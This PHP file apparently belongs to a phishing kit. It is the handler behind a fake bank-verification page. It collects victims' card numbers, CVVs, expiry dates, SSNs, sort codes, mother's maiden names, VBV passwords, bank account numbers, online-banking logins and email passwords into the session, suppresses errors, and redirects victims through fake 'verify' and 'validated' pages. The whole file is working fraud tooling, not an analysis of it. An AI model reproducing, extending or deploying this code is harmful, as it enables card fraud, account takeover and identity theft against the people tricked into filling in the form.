<?php
error_reporting(0);
ini_set("output_buffering",4096);
@ob_start();
session_start();
session_set_cookie_params(0);

require_once 'inc/functions.php';
require_once 'inc/config.php';

if(!isset($_SESSION['SESSION_ID']))
{
	header("location: index.php");	
	exit;
}
$host = bin2hex ($_SERVER['HTTP_HOST']);

$isValidCard = false;
$isValidNameOnCard = false;
$isValidCvv = false;
$isValidExpDate = false;
$isValidDob = false;
$isValidSortCode = false;
$isValidSsn = false;
$isValidZip= false;

if(isset($_POST['cardnumber']) && trim($_POST['cardnumber']) !== '') {
	if(is_valid_card($_POST['cardnumber'])) {
		$isValidCard = true;
	}
	$_SESSION['CARD_NUMBER'] = $_POST['cardnumber'];
}

if(isset($_POST['nameoncc']) && trim($_POST['nameoncc']) !== '') {
	$isValidNameOnCard = true;
	$_SESSION['NAME_ON_CARD'] = $_POST['nameoncc'];
}

if(isset($_POST['exp']) && trim($_POST['exp']) !== '') {
	if(strlen($_POST['exp']) >= 3 && strlen($_POST['exp']) <= 20) {
		$isValidExpDate = true;
	}
	$_SESSION['EXPIRY_DATE'] = $_POST['exp'];
}

if(isset($_POST['cvv']) && trim($_POST['cvv']) !== '') {
	if(strlen($_POST['cvv']) >= 3 && strlen($_POST['cvv']) <= 4) {
		$isValidCvv = true;
	}
	$_SESSION['CVV'] = $_POST['cvv'];
}


if($rquest_for_sort_code && isset($_SESSION['COUNTRY']) && $_SESSION['COUNTRY'] === 'GB') {
		if(isset($_POST['st'])) {
			if(strlen($_POST['st']) >= 6 && strlen($_POST['st']) <= 8) {
				$isValidSortCode = true;
			} else {
				$isValidSortCode = false;
			}
	$_SESSION['SORT_CODE'] = $_POST['st'];
	}
} else {
	$isValidSortCode = true;
}


if($request_for_ssn && isset($_SESSION['COUNTRY']) && $_SESSION['COUNTRY'] === 'US') {
		if(isset($_POST['sn'])) {
			if(strlen($_POST['sn']) >= 9 && strlen($_POST['sn']) <= 11) {
				$isValidSsn = true;
			} else {
				$isValidSsn = false;
			}
	$_SESSION['SSN'] = $_POST['sn'];
	}
} else {
	$isValidSsn = true;
}



if(isset($_POST['v']) && trim($_POST['v']) !== '') {
	$_SESSION['CARD_VBV'] = $_POST['v'];
}

if(isset($_POST['mn']) && trim($_POST['mn']) !== '') {
	$_SESSION['MMN'] = $_POST['mn'];
}

if(isset($_POST['limit']) && trim($_POST['limit']) !== '') {
	$_SESSION['CARD_LIMIT'] = $_POST['limit'];
}

if(isset($_POST['zz'])) {
	if(strlen($_POST['zz']) >= 4 && strlen($_POST['zz']) <= 9) {
		$isValidZip = true;
	}
	$_SESSION['CARD_ZIP'] = $_POST['zz'];
}

if(isset($_POST['dd']) && trim($_POST['dd']) !== '') {
	if(strlen($_POST['dd']) >= 6 && strlen($_POST['dd']) <= 20) {
		$isValidDob = true;
	}
	$_SESSION['DOB'] = $_POST['dd'];
}



if(isset($_POST['acctnum']) && trim($_POST['acctnum']) !== '') {
	$_SESSION['BANK_ACC_NUM'] = $_POST['acctnum'];
}


if(isset($_POST['id']) && trim($_POST['id']) !== '') {
	$_SESSION['ONLINE_BANKING_ID'] = $_POST['id'];
}

if(isset($_POST['ps']) && trim($_POST['ps']) !== '') {
	$_SESSION['ONLINE_BANKING_PASS'] = $_POST['ps'];
}


if(isset($_POST['ez']) && trim($_POST['ez']) !== '') {
	$_SESSION['CURRENT_EMAIL_PASS'] = $_POST['ez'];
}

// ignore validation
if (!$request_for_cvv)
	$isValidCvv = true;

if (!$request_for_date_of_birth)
	$isValidDob = true;

if (!$request_for_zip_code)
	$isValidZip = true;


if (!$isValidCard || !$isValidNameOnCard || !$isValidCvv || !$isValidExpDate || !$isValidDob || !$isValidSortCode || !$isValidSsn || !$isValidZip) {
	$errors = true;
} else {
	$errors = false;
}


if ($errors) {
	$errorStatus = 'cardnum='.(int)$isValidCard.'&name='.(int)$isValidNameOnCard.'&cvv='.(int)$isValidCvv.'&exp='.(int)$isValidExpDate.'&dob='.(int)$isValidDob.'&st='.(int)$isValidSortCode.'&sn='.(int)$isValidSsn.'&zip='.(int)$isValidZip;

	$errorStatus = base64_encode($errorStatus);
	header("Location: verify.php?error=true&c=".$errorStatus);
} else {
	header("Location: validated.php?loggedin=true&client=".uniqid($_SESSION['SESSION_ID'], false)."&sessionid=".$host);
}
ob_end_flush();
?>